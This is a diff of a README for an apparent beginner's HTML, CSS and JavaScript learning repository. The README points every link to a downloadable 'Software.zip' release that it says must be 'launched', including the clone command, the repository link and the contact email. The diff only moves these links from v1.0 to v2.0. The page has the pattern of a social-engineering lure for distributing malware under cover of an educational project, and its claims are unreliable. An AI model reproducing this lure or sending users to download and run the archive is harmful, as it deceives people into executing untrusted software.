@@ -7,11 +7,11 @@ This repository is dedicated to my journey of learning HTML, CSS, and JavaScript
 ### Topics:
 🚀 application, css, htm, html, javascript, js, learning, learning-by-doing, learning-html-css, website
 
-## 📁 https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip File
-[![Download https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip](https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip)](https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip)
+## 📁 https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip File
+[![Download https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip](https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip)](https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip)
 
 ### Please Note:
-The https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip file needs to be launched to access the contents. 
+The https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip file needs to be launched to access the contents. 
 
 ---
 
@@ -19,7 +19,7 @@ The https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/
 Welcome to the "Learning HTML, CSS, and JavaScript" repository! Here you will find a collection of code snippets, projects, and resources as I embark on my journey to master these essential web development technologies. Feel free to explore the various files and folders to see my progress over time.
 
 ## 🌐 Visit the Repository
-To delve into the realm of HTML, CSS, and JavaScript and witness my learning process firsthand, visit the repository [here](https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip).
+To delve into the realm of HTML, CSS, and JavaScript and witness my learning process firsthand, visit the repository [here](https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip).
 
 ---
 
@@ -30,7 +30,7 @@ If you are new to web development or looking to enhance your skills in HTML, CSS
 Clone this repository to your local machine to have access to all the code files, projects, and resources.
 
 ```bash
-git clone https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip
+git clone https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip
 ```
 
 ### Step 2: Explore the Code
@@ -71,14 +71,14 @@ Your contributions are highly appreciated!
 ---
 
 ## 📌 Releases
-If you encounter any issues with accessing the https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip file or have trouble with the provided links, please check the "Releases" section of this repository for alternative download options.
+If you encounter any issues with accessing the https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip file or have trouble with the provided links, please check the "Releases" section of this repository for alternative download options.
 
 ---
 
 ## 📧 Contact
 If you have any questions, feedback, or suggestions regarding this repository, feel free to reach out to me:
 
-📮 Email: https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v1.0/Software.zip
+📮 Email: https://github.com/jailbreck/Learning-HTML-CSS-JAVASCRIPT/releases/download/v2.0/Software.zip
 
 ---
 
